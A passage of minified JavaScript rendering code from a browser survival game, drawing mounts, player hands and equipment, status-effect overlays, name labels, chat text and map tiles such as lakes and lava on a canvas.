                                    fe.restore(),
                                    n = sprite[ze.BABY_DRAGON_WING_RIGHT_TAMED][Fe.time],
                                    fe.save(),
                                    fe.translate(40 * Pe, -45 * Pe),
                                    fe.rotate(-this.vehicle_fx4.v * this.vehicle_fx1),
                                    Ke(fe, n, -w / 4, -h / 4, w / 2, h / 2),
                                    fe.restore()) : this.vehicle === Be.NIMBUS ? (this.vehicle_fx5 = Utils.lerp(this.vehicle_fx5, this.speed, .018),
                                        n = sprite[ze.NIMBUS][Fe.time],
                                        Gr(ze.NIMBUS, n, -n.width / 4, -n.height / 4)) : this.vehicle === Be.PLANE ? (this.vehicle_fx5 = Utils.lerp(this.vehicle_fx5, this.speed, .018),
                                            n = sprite[ze.PLANE][Fe.time],
                                            Gr(ze.PLANE, n, -n.width / 4, -n.height / 4)) : this.vehicle === Be.SLED ? (n = sprite[ze.SLED][Fe.time],
                                                Gr(ze.SLED, n, -n.width / 4, -n.height / 4)) : this.vehicle === Be.BABY_MAMMOTH ? (n = sprite[ze.BABY_MAMMOTH_TAMED][Fe.time],
                                                    85 < this.speed ? this.vehicle_fx1 = Math.min(1, this.vehicle_fx1 + qe / 4) : this.vehicle_fx1 = Math.max(0, this.vehicle_fx1 - qe),
                                                    this.vehicle_fx3 += 60 * qe,
                                                    60 < this.vehicle_fx3 && (this.vehicle_fx3 -= 60),
                                                    e = this.vehicle_fx1 * (12 * (this.vehicle_fx3 < 30 ? this.vehicle_fx3 / 30 : 1 - (this.vehicle_fx3 - 30) / 30) - 6),
                                                    Gr(ze.BABY_MAMMOTH_TAMED, n, -n.width / 4, -n.height / 4 + e)) : this.vehicle === Be.MOUNT_BOAR ? (n = sprite[ze.BOAR_TAMED][Fe.time],
                                                        85 < this.speed ? this.vehicle_fx1 = Math.min(1, this.vehicle_fx1 + qe / 4) : this.vehicle_fx1 = Math.max(0, this.vehicle_fx1 - qe),
                                                        this.vehicle_fx3 += 60 * qe,
                                                        60 < this.vehicle_fx3 && (this.vehicle_fx3 -= 60),
                                                        e = this.vehicle_fx1 * (12 * (this.vehicle_fx3 < 30 ? this.vehicle_fx3 / 30 : 1 - (this.vehicle_fx3 - 30) / 30) - 6),
                                                        Gr(ze.BOAR_TAMED, n, -n.width / 4, -n.height / 4 + e)) : this.vehicle === Be.CRAB_BOSS && (t = Math.PI / 2,
                                                            i = Math.PI / 4,
                                                            n = sprite[ze.CRAB_BOSS_TAMED][Fe.time],
                                                            85 < this.speed ? this.vehicle_fx1 = Math.min(1, this.vehicle_fx1 + qe / 4) : this.vehicle_fx1 = Math.max(0, this.vehicle_fx1 - qe),
                                                            this.vehicle_fx3 += 60 * qe,
                                                            60 < this.vehicle_fx3 && (this.vehicle_fx3 -= 60),
                                                            e = this.vehicle_fx1 * (12 * (this.vehicle_fx3 < 30 ? this.vehicle_fx3 / 30 : 1 - (this.vehicle_fx3 - 30) / 30) - 6),
                                                            Gr(ze.CRAB_BOSS_TAMED, n, -n.width / 4 + e, -n.height / 4),
                                                            fe.restore(),
                                                            fe.save(),
                                                            fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                                                            fe.rotate(Math.PI + this.vehicle_fx2 + i),
                                                            fe.translate(120, e),
                                                            fe.rotate(t),
                                                            n = sprite[ze.CRAB_BOSS_CLAW_LEFT][Fe.time],
                                                            w = -n.width,
                                                            h = -n.height,
                                                            Ke(fe, n, -w / 2, -h / 2, w, h),
                                                            fe.restore(),
                                                            fe.save(),
                                                            fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                                                            fe.rotate(Math.PI + this.vehicle_fx2 + t + i),
                                                            fe.translate(120, e),
                                                            fe.rotate(t),
                                                            n = sprite[ze.CRAB_BOSS_CLAW_RIGHT][Fe.time],
                                                            w = -n.width,
                                                            h = -n.height,
                                                            Ke(fe, n, -w / 2, -h / 2, w, h)),
                    fe.restore())
            }
            function Er(e, t, i) {
                var n, r, o, a;
                return 1 !== t.tryLoad() ? t : (void 0 === (n = __IMAGE_EFFECT__[i][e]) && (r = (n = document.createElement("canvas")).getContext("2d"),
                    o = t.width,
                    a = t.height,
                    n.width = o,
                    n.height = a,
                    r.drawImage(t, 0, 0),
                    r.globalCompositeOperation = "source-in",
                    r.fillStyle = __IMAGE_EFFECT_COLOR__[i],
                    r.fillRect(0, 0, o, a),
                    __IMAGE_EFFECT__[i][e] = n),
                    n)
            }
            function ur() {
                var e, t = 0;
                switch (this.right) {
                    case ze.WOOD_SHIELD:
                    case ze.STONE_SHIELD:
                    case ze.GOLD_SHIELD:
                    case ze.DIAMOND_SHIELD:
                    case ze.AMETHYST_SHIELD:
                    case ze.REIDITE_SHIELD:
                        t = 1
                }
                if (this.ghost)
                    for (var i = 0; i < this.bubbles.length; i++) {
                        var n = this.bubbles[i]
                            , r = .5 < n.life ? 1 - 2 * (n.life - .5) : 2 * n.life
                            , o = (fe.globalAlpha = r,
                                sprite[ze.BUBBLES][Fe.time][n.id]);
                        Ke(fe, o, xe.cam.x + n.x - o.width / 2, xe.cam.y + n.y - o.height / 2),
                            fe.globalAlpha = 1
                    }
                else {
                    if (fe.save(),
                        fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                        Fe.dist_from_biomes(this),
                        this.action & R.ATTACK) {
                        var a = this;
                        if (0 <= a.right)
                            switch (a.right) {
                                case ze.WATERING_CAN_FULL:
                                    fe.save();
                                    var s = -3 * a.attack.v / Math.PI
                                        , _ = a.attack.o ? -Math.PI / 3 - (Math.PI / 3 + a.attack.v) / 3 : a.attack.v;
                                    fe.rotate(a.angle - Math.PI / 2 + _),
                                        fe.globalAlpha = s / 1.2,
                                        ke(fe, -40 * Pe, 90 * Pe, 5 * Pe),
                                        he(fe, "#0B6A84"),
                                        fe.globalAlpha = s / 1.2,
                                        ke(fe, -52 * Pe, 100 * Pe, 8 * Pe),
                                        he(fe, "#0B6A84"),
                                        fe.globalAlpha = s / 1.2,
                                        ke(fe, -30 * Pe, 95 * Pe, 4 * Pe),
                                        he(fe, "#0B6A84"),
                                        fe.globalAlpha = 1,
                                        fe.restore();
                                    break;
                                case ze.SHOVEL:
                                case ze.SHOVEL_GOLD:
                                case ze.SHOVEL_DIAMOND:
                                case ze.SHOVEL_AMETHYST:
                                    1 !== a.fly && (e = (0 < a.dist_winter ? ze.ICE_SHOVEL_CO : 0 < a.dist_sand || 0 < a.dist_desert ? ze.SAND_SHOVEL_CO : ze.GRD_SHOVEL_CO)[Fe.time],
                                        s = -3 * a.attack.v / Math.PI,
                                        0 === (_ = a.attack.o ? Math.max(.5 - s / 2 + .5, 0) : Math.max(s / 2, 0)) && (a.angle_init = a.angle),
                                        fe.save(),
                                        fe.rotate(a.angle_init - Math.PI / 2),
                                        fe.globalAlpha = s,
                                        ke(fe, s = 25 * Pe + 25 * _, 80 * Pe, 15 * Pe),
                                        he(fe, e),
                                        ke(fe, -s, 80 * Pe, 15 * Pe),
                                        he(fe, e),
                                        fe.globalAlpha = 1,
                                        fe.restore())
                            }
                    }
                    fe.save(),
                        fe.rotate(this.angle - Math.PI / 2),
                        this.action & R.ATTACK || (this.action & R.IDLE || 0 !== this.vehicle ? this.idle.update() : this.action & R.WALK && this.walk.update());
                    var E, u, d, T = this.idle.v, A = this.walk.v, h = this.clothe === ze.WINTER_HOOD ? (o = sprite[ze.GLOVES_HOOD][Fe.time],
                        ze.GLOVES_HOOD) : this.clothe === ze.DIAMOND_PROTECTION ? (o = sprite[ze.GLOVES_DIAMOND_PROTECTION][Fe.time],
                            ze.GLOVES_DIAMOND_PROTECTION) : this.clothe === ze.AMETHYST_PROTECTION ? (o = sprite[ze.GLOVES_AMETHYST_PROTECTION][Fe.time],
                                ze.GLOVES_AMETHYST_PROTECTION) : this.clothe === ze.REIDITE_PROTECTION ? (o = sprite[ze.GLOVES_REIDITE_PROTECTION][Fe.time],
                                    ze.GLOVES_REIDITE_PROTECTION) : this.superzombie ? (o = sprite[ze.ZOMBIE_HAND][Fe.time],
                                        ze.ZOMBIE_HAND) : (o = sprite[ze.HAND][this.skin][Fe.time],
                                            ze.HAND), l = (shadow = sprite[ze.HAND_SHADOW][Fe.time],
                                                o), I = h;
                    if (this.action & R.ATTACK ? (this.attack.update() && 0 == this.attack.o && (this.hand = !this.hand,
                        this.action -= R.ATTACK,
                        this.uid == xe.uid) && (xe.control.mouse = 0),
                        0 <= this.right && (this.hand = !0),
                        d = this.hand ? this.attack.v : -this.attack.v / 3,
                        E = this.hand ? this.attack.v / 3 : -this.attack.v,
                        this.superzombie ? (fe.save(),
                            fe.rotate(d),
                            fr(h, o, -o.width / 2 - Pe * (66 + T), -o.height / 2 + (5 + A) * Pe),
                            fe.restore(),
                            fe.save(),
                            fe.rotate(E),
                            fr(h, o, -o.width / 2 + Pe * (66 + T), -o.height / 2 + (5 + A) * Pe),
                            fe.restore()) : 0 === t && (this.right === ze.WOOD_BOW && (d = -Utils.ease_out_quad(-d)),
                                fe.save(),
                                fe.rotate(d),
                                fr(ze.HAND_SHADOW, shadow, -shadow.width / 2 - Pe * (49 + T), -shadow.height / 2 + (15 + A) * Pe),
                                this.right === ze.BOOK ? (u = sprite[this.right][this.book][Fe.time],
                                    Lr(this.right, this.book, u, -u.width / 4 - Pe * (62 + T), -u.height / 4 + Pe * (A + 18))) : ar(this.right, T, A),
                                h >= ze.GLOVES_DIAMOND_PROTECTION ? Gr(h, o, -o.width / 4 - Pe * (49 + T), -o.height / 4 + (11 + A) * Pe) : h !== ze.GLOVES_HOOD ? Lr(h, this.skin, o, -o.width / 4 - Pe * (49 + T), -o.height / 4 + (11 + A) * Pe) : fr(h, o, -o.width / 2 - Pe * (49 + T), -o.height / 2 + (11 + A) * Pe),
                                fe.restore(),
                                fe.save(),
                                fe.rotate(E),
                                fr(ze.HAND_SHADOW, shadow, -shadow.width / 2 + Pe * (49 + T), -shadow.height / 2 + (15 + A) * Pe),
                                h >= ze.GLOVES_DIAMOND_PROTECTION ? Gr(h, o, -o.width / 4 + Pe * (49 + T), -o.height / 4 + (11 + A) * Pe) : h !== ze.GLOVES_HOOD ? Lr(h, this.skin, o, -o.width / 4 + Pe * (49 + T), -o.height / 4 + (11 + A) * Pe) : fr(h, o, -o.width / 2 + Pe * (49 + T), -o.height / 2 + (11 + A) * Pe),
                                fe.restore())) : this.superzombie ? (fr(h, o, -o.width / 2 - Pe * (66 + T), -o.height / 2 + (5 + A) * Pe),
                                    fr(h, o, -o.width / 2 + Pe * (66 + T), -o.height / 2 + (5 + A) * Pe)) : 0 === t && (fr(ze.HAND_SHADOW, shadow, -shadow.width / 2 - Pe * (49 + T), -shadow.height / 2 + (15 + A) * Pe),
                                        this.right === ze.BOOK ? (u = sprite[this.right][this.book][Fe.time],
                                            Lr(this.right, this.book, u, -u.width / 4 - Pe * (62 + T), -u.height / 4 + Pe * (A + 18))) : ar(this.right, T, A),
                                        h >= ze.GLOVES_DIAMOND_PROTECTION ? Gr(h, o, -o.width / 4 - Pe * (49 + T), -o.height / 4 + (11 + A) * Pe) : h !== ze.GLOVES_HOOD ? Lr(h, this.skin, o, -o.width / 4 - Pe * (49 + T), -o.height / 4 + (11 + A) * Pe) : fr(h, o, -o.width / 2 - Pe * (49 + T), -o.height / 2 + (11 + A) * Pe),
                                        fr(ze.HAND_SHADOW, shadow, -shadow.width / 2 + Pe * (49 + T), -shadow.height / 2 + (15 + A) * Pe),
                                        h >= ze.GLOVES_DIAMOND_PROTECTION ? Gr(h, o, -o.width / 4 + Pe * (49 + T), -o.height / 4 + (11 + A) * Pe) : h !== ze.GLOVES_HOOD ? Lr(h, this.skin, o, -o.width / 4 + Pe * (49 + T), -o.height / 4 + (11 + A) * Pe) : fr(h, o, -o.width / 2 + Pe * (49 + T), -o.height / 2 + (11 + A) * Pe)),
                        this.bag && this.clothe < 1 && (o = sprite[ze.BAG][this.baglook][Fe.time],
                            Lr(ze.BAG, this.baglook, o, -o.width / 4, -o.height / 4 - 39 * Pe)),
                        this.superzombie ? (o = sprite[ze.ZOMBIE_BODY][Fe.time],
                            fr(ze.ZOMBIE_BODY, o, -o.width / 2, -o.height / 2),
                            this.move_head.update(),
                            o = sprite[ze.ZOMBIE_HEAD][Fe.time],
                            fr(ze.ZOMBIE_HEAD, o, -o.width / 2, -o.height / 2 + this.move_head.v)) : (o = sprite[ze.BODY][this.skin][Fe.time],
                                this.clothe !== ze.WINTER_HOOD && (Lr(ze.BODY, this.skin, o, -o.width / 4, -o.height / 4),
                                    0 < this.accessory) && (o = sprite[ze.ACCESSORY][this.accessory][Fe.time],
                                        Lr(ze.ACCESSORY, this.accessory, o, -o.width / 4, -o.height / 4))),
                        this.action & R.HEAL && (this.heal.update() && 0 == this.heal.o && (this.action -= R.HEAL),
                            fe.globalAlpha = .6 - this.heal.v,
                            this.superzombie ? (o = sprite[ze.ZOMBIE_HEAL],
                                Ke(fe, o, -o.width / 2, -o.height / 2)) : (o = Er(this.skin, sprite[ze.BODY][this.skin][0], __EFFECT_HEAL__),
                                    Ke(fe, o, o.width / 4, o.height / 4, -o.width / 2, -o.height / 2)),
                            fe.globalAlpha = 1),
                        this.action & R.WEB && (this.web.update() && 0 == this.web.o && (this.action -= R.WEB),
                            fe.globalAlpha = .6 - this.web.v,
                            o = sprite[ze.WEB],
                            Ke(fe, o, -o.width / 2, -o.height / 2),
                            fe.globalAlpha = 1),
                        this.action & R.HURT && (this.hit && this.hit.update() && 0 == this.hit.o && (this.action -= R.HURT),
                            fe.globalAlpha = .6 - this.hit.v,
                            this.superzombie ? (o = sprite[ze.ZOMBIE_HURT],
                                Ke(fe, o, -o.width / 2, -o.height / 2)) : (o = Er(this.skin, sprite[ze.BODY][this.skin][0], __EFFECT_HURT__),
                                    Ke(fe, o, o.width / 4, o.height / 4, -o.width / 2, -o.height / 2)),
                            fe.globalAlpha = 1),
                        this.action & R.COLD && (this.freeze.update() && 0 == this.freeze.o && (this.action -= R.COLD),
                            fe.globalAlpha = .6 - this.freeze.v,
                            o = Er(this.skin, sprite[ze.BODY][this.skin][0], __EFFECT_COLD__),
                            Ke(fe, o, o.width / 4, o.height / 4, -o.width / 2, -o.height / 2),
                            fe.globalAlpha = 1),
                        this.action & R.HUNGER && (this.starve.update() && 0 == this.starve.o && (this.action -= R.HUNGER),
                            fe.globalAlpha = .6 - this.starve.v,
                            this.superzombie ? (o = sprite[ze.ZOMBIE_HUNGER],
                                Ke(fe, o, -o.width / 2, -o.height / 2)) : (o = Er(this.skin, sprite[ze.BODY][this.skin][0], __EFFECT_HUNGER__),
                                    Ke(fe, o, o.width / 4, o.height / 4, -o.width / 2, -o.height / 2)),
                            fe.globalAlpha = 1),
                        sr(this.clothe),
                        1 === t) {
                        this.action & R.ATTACK && (T += 15 * this.attack.v),
                            fr(ze.HAND_SHADOW, shadow, -shadow.width / 2 - 26 * Pe, -shadow.height / 2 + (31 + A + T) * Pe),
                            I >= ze.GLOVES_DIAMOND_PROTECTION ? Gr(I, l, -l.width / 4 - 26 * Pe, -l.height / 4 + (27 + A + T) * Pe) : I !== ze.GLOVES_HOOD ? Lr(I, this.skin, l, -l.width / 4 - 26 * Pe, -l.height / 4 + (27 + A + T) * Pe) : fr(I, l, -l.width / 2 - 26 * Pe, -l.height / 2 + (27 + A + T) * Pe),
                            fr(ze.HAND_SHADOW, shadow, -shadow.width / 2 + 26 * Pe, -shadow.height / 2 + (31 + A + T) * Pe),
                            I >= ze.GLOVES_DIAMOND_PROTECTION ? Gr(I, l, -l.width / 4 + 26 * Pe, -l.height / 4 + (27 + A + T) * Pe) : I !== ze.GLOVES_HOOD ? Lr(I, this.skin, l, -l.width / 4 + 26 * Pe, -l.height / 4 + (27 + A + T) * Pe) : fr(I, l, -l.width / 2 + 26 * Pe, -l.height / 2 + (27 + A + T) * Pe);
                        {
                            var c = this.right;
                            var O = 0;
                            var g = A + T;
                            if (0 <= c)
                                switch (img = sprite[c][Fe.time],
                                c) {
                                    case ze.WOOD_SHIELD:
                                    case ze.STONE_SHIELD:
                                    case ze.GOLD_SHIELD:
                                        Gr(c, img, -img.width / 4 - Pe * (0 + O), -img.height / 4 + Pe * (g + 35));
                                        break;
                                    case ze.DIAMOND_SHIELD:
                                        Gr(c, img, -img.width / 4 - Pe * (1 + O), -img.height / 4 + Pe * (g + 45));
                                        break;
                                    case ze.AMETHYST_SHIELD:
                                    case ze.REIDITE_SHIELD:
                                        Gr(c, img, -img.width / 4 - Pe * (1 + O), -img.height / 4 + Pe * (g + 40))
                                }
                        }
                    }
                    fe.restore(),
                        this.clothe !== ze.HOOD && this.clothe !== ze.WINTER_HOOD ? (o = 0 < this.dist_winter ? (this.player.label_winter || (this.player.label_winter = Tt(Pe, this.player.nickname, 20, "#187484", "#000", 2, null, null, 300 * Pe)),
                            this.player.label_winter) : (this.player.label || (this.player.label = Tt(Pe, this.player.nickname, 20, "#FFF", "#000", 2, null, null, 300 * Pe)),
                                this.player.label),
                            Fe.day == ze.NIGHT && (fe.globalAlpha = .5),
                            T = Math.floor(-o.width / 2),
                            A = Math.floor(-o.height / 2 - 70 * Pe),
                            Ke(fe, o, T, A),
                            0 < this.player.level && (d = T + o.width + 5,
                                o = sprite[ze.VERIFIED],
                                void 0 === PLAYER_LEVEL[this.player.level] && (PLAYER_LEVEL[this.player.level] = Tt(Pe, "[" + this.player.level + "]", 20, "#F9E8A2", "#000", 2, null, null, 50 * Pe)),
                                Ke(fe, PLAYER_LEVEL[this.player.level], d, A)),
                            fe.globalAlpha = 1) : (A = Math.floor(-70 * Pe),
                                T = Math.floor(sprite[ze.ICON_MEMBER].width / 1.5)),
                        xe.in_team(this.pid) && (o = this.pid == xe.team[0] ? sprite[ze.ICON_LEADER] : sprite[ze.ICON_MEMBER],
                            Ke(fe, o, T - o.width - 5, A - 6)),
                        fe.restore(),
                        fe.restore()
                }
            }
            function dr() {
                var e, t;
                this.enabled && 0 <= this.delay && (.5 < (t = (e = (new Date).getTime() - this.delay) % 1e3 / 1e3) ? t = 1 - 2 * (t - .5) : t *= 2,
                    (e = Math.floor(e / 1e3)) < Ue.GHOST_DELAY) && (e = Ue.GHOST_DELAY - e,
                        this.label || (this.label = Tt(Pe, " seconds before you die", 40, "#660000", null, null, null, null, null, "#000", 10)),
                        this.now == e && this.sec || (this.now = e,
                            this.sec = Tt(Pe, "" + e, 40, "#660000", null, null, null, null, null, "#000", 10)),
                        Ke(fe, this.label, (Le - this.label.width) / 2, 100 * Pe),
                        fe.globalAlpha = t,
                        Ke(fe, this.sec, (Le - this.label.width) / 2 - this.sec.width + 15 * Pe, 100 * Pe),
                        fe.globalAlpha = 1)
            }
            function Tr() {
                var e;
                void 0 !== this.message && (e = 0 < xe.inv.can_select.length ? -95 : 0,
                    Ke(fe, this.message, 0, Ge - this.message.height + e))
            }
            function Ar(e, t) {
                this.text && (this.timeout.o ? fe.globalAlpha = 1 - this.timeout.v : fe.globalAlpha = 1,
                    this.label || (this.label = Tt(Pe, this.text, 40, e, null, null, null, null, null, t, 10)),
                    Ke(fe, this.label, (Le - this.label.width) / 2, 50 * Pe),
                    fe.globalAlpha = 1,
                    this.timeout.update()) && 0 == this.timeout.o && (this.text = this.list.shift(),
                        this.label = null)
            }
            function hr() {
                if (fe.save(),
                    fe.translate(xe.cam.x + this.x, xe.cam.y + this.y),
                    0 < this.text.length) {
                    for (var e = 0; e < this.text.length && e < 2; e++)
                        this.label[e] || (this.label[e] = (i = Pe,
                            n = this.text[e],
                            E = _ = s = a = o = r = void 0,
                            r = document.createElement("canvas"),
                            o = r.getContext("2d"),
                            a = Math.floor(28 * i),
                            s = Math.floor(20 * i),
                            o.font = s + "px Baloo Paaji",
                            _ = 8 * i,
                            E = o.measureText(n).width + 2 * _,
                            Ve(o, 0, 0, r.width = E, r.height = a, 10 * i),
                            o.globalAlpha = .5,
                            he(o, "#000"),
                            o.globalAlpha = 1,
                            o.textBaseline = "middle",
                            o.font = s + "px Baloo Paaji",
                            o.beginPath(),
                            o.fillStyle = "#FFF",
                            o.fillText(n, _, a / 2),
                            r),
                            this.text_effect[e] = 0,
                            this.text_move[e] = 0),
                            1 === e && (this.text_move[0] = 30 * Utils.ease_in_out_quad(this.text_ease));
                    for (this.text_effect[0] += qe,
                        1 < this.text.length && (this.text_ease = Math.min(this.text_ease + qe, 1),
                            1 < this.text_effect[0]) && .5 < this.text_ease && (this.text_effect[1] += qe),
                        e = 0; e < this.text.length && e < 2; e++) {
                        var t = this.text_effect[e];
                        0 < t && (fe.globalAlpha = t < .25 ? 4 * t : 3.75 < t ? Math.max(4 * (4 - t), 0) : 1,
                            Ke(fe, this.label[e], -this.label[e].width / 2, -this.text_move[e] + -this.label[e].height / 2 - 110 * Pe))
                    }
                    4 < this.text_effect[0] && (this.text_effect.shift(),
                        this.text.shift(),
                        this.text_move.shift(),
                        this.label.shift(),
                        this.text_ease = 0)
                }
                var i, n, r, o, a, s, _, E;
                fe.restore()
            }
            __EFFECT_HURT__ = 0,
                __EFFECT_HEAL__ = 1,
                __EFFECT_COLD__ = 2,
                __EFFECT_HUNGER__ = 3,
                __EFFECT_BOX__ = 4,
                __IMAGE_EFFECT__ = [[], [], [], [], []],
                __IMAGE_EFFECT_COLOR__ = ["#BB0000", "#00BB00", "#1CE7E0", "#DBE71C", "#BB0000"];
            var lr = 0;
            function Ir(e, t, i, n, r, o, a, s) {
                void 0 === s && (s = 0);
                for (var _ = a; s <= _; _--)
                    for (var E = e; E <= t; E++)
                        for (var u = i; u <= n; u++) {
                            var d = Eo.tiles[E][u];
                            if (d && d[o]) {
                                var T = d[o][_];
                                if (void 0 !== T)
                                    for (var A = 0; A < T.length; A++) {
                                        var h = T[A]
                                            , l = sprite[r][Fe.time][_]
                                            , I = (lr + 3 * (E + u)) % 60
                                            , c = -l.width * (1 + .9 * (g = I < 30 ? I / 30 : 1 - (I - 30) / 30) / 30)
                                            , O = -l.height * (1 + .9 * g / 30)
                                            , g = (I = (lr + 7 * (E + u)) % 60) < 30 ? I / 30 : 1 - (I - 30) / 30
                                            , I = fe.globalAlpha;
                                        fe.globalAlpha = (.9 + .1 * g) * I,
                                            Ke(fe, l, xe.cam.x + h.x - c / 2, xe.cam.y + h.y - O / 2, c, O),
                                            fe.globalAlpha = I
                                    }
                            }
                        }
            }
            function cr(e, t, i, n, r, o, a, s) {
                void 0 === s && (s = 0),
                    Fe.breath[r].update();
                for (var _ = a; s <= _; _--)
                    for (var E = e; E <= t; E++)
                        for (var u = i; u <= n; u++) {
                            var d = Eo.tiles[E][u];
                            if (d && d[o]) {
                                var T = d[o][_];
                                if (void 0 !== T)
                                    for (var A = 0; A < T.length; A++) {
                                        var h, l = T[A], I = l.update ? (l.hit.update() && 0 == l.hit.o && (l.update = !1),
                                            I = (1 - l.hit.v) * qe * 600 * Pe,
                                            h = Math.cos(l.angle) * I,
                                            Math.sin(l.angle) * I) : h = 0, c = sprite[r][Fe.time][_], O = -c.width * Fe.breath[r].v, g = -c.height * Fe.breath[r].v;
                                        Ke(fe, c, xe.cam.x + l.x - O / 2 + h, xe.cam.y + l.y - g / 2 + I, O, g)
                                    }
                            }
                        }
            }
            var Or = [];
            for (Ze = 0; Ze < 100; Ze++) {
                var gr = 1;
                Math.random() < .25 && (gr = 0),
                    Or.push(gr)
            }
            function pr(e, t, i, n, r, o, a, s, _) {
                void 0 === s && (s = 0);
                for (var E = a; s <= E; E--)
                    for (var u = e; u <= t; u++)
                        for (var d = i; d <= n; d++)
                            if (!(0 < _ && 1 === Or[(u + d * _) % Or.length])) {
                                var T = Eo.tiles[u][d];
                                if (void 0 !== T && void 0 !== T[o]) {
                                    var A = T[o][E];
                                    if (void 0 !== A)
                                        for (var h = 0; h < A.length; h++) {
                                            var l, I = A[h], c = I.update ? (I.hit.update() && 0 == I.hit.o && (I.update = !1),
                                                c = (1 - I.hit.v) * qe * 600 * Pe,
                                                l = Math.cos(I.angle) * c,
                                                Math.sin(I.angle) * c) : l = 0, O = sprite[r][Fe.time][E];
                                            Ke(fe, O, xe.cam.x + I.x - O.width / (2 * _scale_object) + l, xe.cam.y + I.y - O.height / (2 * _scale_object) + c, O.width / _scale_object, O.height / _scale_object)
                                        }
                                }
                            }
            }
            function Rr(e, t, i, n, r, o, a, s) {
                void 0 === s && (s = 0);
                for (var _ = e; _ <= t; _++)
                    for (var E = i; E <= n; E++) {
                        var u = Eo.tiles[_][E];
                        if (void 0 !== u && void 0 !== u[o]) {
                            var d = u[o];
                            if (void 0 !== d)
                                if (1 === d.scale) {
                                    var T = sprite[r][Fe.time][d._id];
                                    fe.save(),
                                        fe.translate(xe.cam.x + d.x, xe.cam.y + d.y),
                                        fe.rotate(d.angle),
                                        Ke(fe, T, -T.width / 4, -T.height / 4, T.width / 2, T.height / 2),
                                        fe.restore()
                                } else if (3 === d.scale)
                                    for (var A = 0; A < d.p.length; A++)
                                        fe.save(),
                                            fe.translate(xe.cam.x + d.x, xe.cam.y + d.y),
                                            fe.rotate(d.p[A].angle),
                                            T = sprite[r][Fe.time][d.p[A]._id],
                                            Ke(fe, T, -T.width / 3 + d.p[A].x, -T.height / 3 + d.p[A].y, T.width / 1.5, T.height / 1.5),
                                            fe.restore();
                                else
                                    T = sprite[r][Fe.time][d._id],
                                        fe.save(),
                                        fe.translate(xe.cam.x + d.x, xe.cam.y + d.y),
                                        fe.rotate(d.angle),
                                        Ke(fe, T, -T.width / 2, -T.height / 2, T.width, T.height),
                                        fe.restore()
                        }
                    }
            }
            function Cr(e, t, i, n, r, o, a, s) {
                void 0 === s && (s = 0);
                for (var _ = a; s <= _; _--)
                    for (var E = e; E <= t; E++)
                        for (var u = i; u <= n; u++) {
                            var d = Eo.tiles[E][u];
                            if (void 0 !== d && void 0 !== d[o]) {
                                var T = d[o][_];
                                if (void 0 !== T)
                                    for (var A = 0; A < T.length; A++)
                                        for (var h, l, I = T[A], c = I.update ? (I.hit.update() && 0 == I.hit.o && (I.update = !1),
                                            h = (1 - I.hit.v) * qe * 600 * Pe,
                                            l = Math.cos(I.angle) * h,
                                            Math.sin(I.angle) * h) : l = 0, O = 0; O < _bubble[_].amount; O++) {
                                            Fe.lava[O].last !== ho && (Fe.lava[O].update(),
                                                Fe.lava[O].last = ho);
                                            var g = sprite[ze.LAVA_BUBBLE][Fe.time][_bubble[_].pos[O].t]
                                                , p = -g.width * Fe.lava[O].v
                                                , R = -g.height * Fe.lava[O].v;
                                            Ke(fe, g, xe.cam.x + I.x - p / 4 + l + _bubble[_].pos[O].x, xe.cam.y + I.y - R / 4 + c + _bubble[_].pos[O].y, p / 2, R / 2)
                                        }
                            }
                        }
            }
            _scale_object = 1,
                _bubble = [{
                    amount: 10,
                    pos: [{
                        x: -128,
                        y: -20,
                        t: 0
                    }, {
                        x: -86,
                        y: -4,
                        t: 1
                    }, {
                        x: -60,
                        y: -74,
                        t: 2
                    }, {
                        x: -22,
                        y: -144,
                        t: 0
                    }, {
                        x: -58,
                        y: 86,
                        t: 0
                    }, {
                        x: 3,
                        y: -30,
                        t: 0
                    }, {
                        x: 65,
                        y: -115,
                        t: 1
                    }, {
                        x: 118,
                        y: -50,
                        t: 0
                    }, {
                        x: 73,
                        y: 15,
                        t: 1
                    }, {
                        x: 67,
                        y: 79,
                        t: 0
                    }]
                }, {
                    amount: 5,
                    pos: [{
                        x: -45,
                        y: -26,
                        t: 0
                    }, {
                        x: -45,
                        y: 20,
                        t: 2
                    }, {
                        x: 10,
                        y: -60,
                        t: 1
                    }, {
                        x: 52,
                        y: -17,
                        t: 1
                    }, {
                        x: 14,
                        y: 45,
                        t: 0
                    }]
                }, {
                    amount: 3,
                    pos: [{
                        x: -30,
                        y: 3,
                        t: 2
                    }, {
                        x: 7,
                        y: -38,
                        t: 2
                    }, {
                        x: 37,
                        y: 5,
                        t: 2
                    }]
                }, {
                    amount: 11,
                    pos: [{
                        x: -74,
                        y: -87,
                        t: 2
                    }, {
                        x: -11,
                        y: -10,
                        t: 1
                    }, {
                        x: -99,
                        y: 17,
                        t: 1
                    }, {
                        x: -66,
                        y: 84,
                        t: 0
                    }, {
                        x: -55,
                        y: 123,
                        t: 1
                    }, {
                        x: 10,
                        y: 81,
                        t: 2
                    }, {
                        x: 52,
                        y: 50,
                        t: 0
                    }, {
                        x: 138,
                        y: 9,
                        t: 1
                    }, {
                        x: 104,
                        y: -28,
                        t: 0
                    }, {
                        x: 67,
                        y: -56,
                        t: 2
                    }, {
                        x: 5,
                        y: -112,
                        t: 0
                    }]
                }, {
                    amount: 6,
                    pos: [{
                        x: -33,
                        y: -66,
                        t: 2
                    }, {
                        x: -58,
                        y: 10,
                        t: 0
                    }, {
                        x: -19,
                        y: 44,
                        t: 1
                    }, {
                        x: 44,
                        y: 20,
                        t: 0
                    }, {
                        x: 53,
                        y: -36,
                        t: 2
                    }, {
                        x: 7,
                        y: -62,
                        t: 0
                    }]
                }, {
                    amount: 3,
                    pos: [{
                        x: -19,
                        y: -25,
                        t: 1
                    }, {
                        x: -29,
                        y: 13,
                        t: 2
                    }, {
                        x: 12,
                        y: 12,
                        t: 0
                    }]
                }];
            var br = 0
                , Nr = 0
                , Sr = 0
                , mr = 0;
            function Dr() {
                var e = br
                    , t = Nr
                    , i = Sr
                    , n = mr;
                Se.quality && Hr(pr, i, n, e, t, ze.LAKE_EDGE, "l", 2),
                    Se.quality && Hr(pr, i, n, e, t, ze.LAVA_GROUND, "la", 5),
                    Hr(pr, i, n, e, t, ze.MAGMA, "la", 5),
                    Hr(cr, i, n, e, t, ze.LAKE, "l", 2),
                    Se.quality && (Hr(Cr, i, n, e, t, ze.MAGMA, "la", 5),
                        Hr(cr, i, n, e, t, ze.LAKE_DEEP, "l", 2)),
                    Hr(pr, i, n, e, t, ze.MARKER, "ma", 3);
